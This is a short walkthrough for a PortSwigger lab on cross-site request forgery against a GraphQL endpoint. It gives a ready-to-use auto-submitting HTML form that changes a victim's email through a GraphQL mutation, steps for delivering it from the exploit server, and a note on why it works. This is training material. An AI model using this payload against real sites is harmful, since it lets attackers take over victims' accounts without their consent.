# [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

> A GraphQL endpoint path (check Burp's Proxy history, it's usually `/graphql/v1`).

## Ready-to-use HTML

```html
<html>
  <body>
    <form action="https://xxx/graphql/v1" method="POST">
      <input
        type="hidden"
        name="query"
        value="&#10;&#9;&#9;mutation changeEmail($input: ChangeEmailInput!) {&#10;&#9;&#9;&#9;changeEmail(input: $input) {&#10;&#9;&#9;&#9;&#9;email&#10;&#9;&#9;&#9;}&#10;&#9;&#9;}&#10;&#9;"
      />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value='{"input":{"email":"duck@quack.com"}}' />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Steps to finish

- Look at the browser URL bar in the browser adn replace the xxx with it.
- Pick any new email for the `value='{"input":{"email":"..."}}'` line.
- Go to the exploit server and paste the HTML into the body field.
- Click Deliver exploit to victim.

## Why this works

- The GraphQL endpoint accepts form-encoded `POST` requests.
- Browsers auto-send cookies with form submissions.
- No CSRF token is required, so the victim's browser does the request for you.
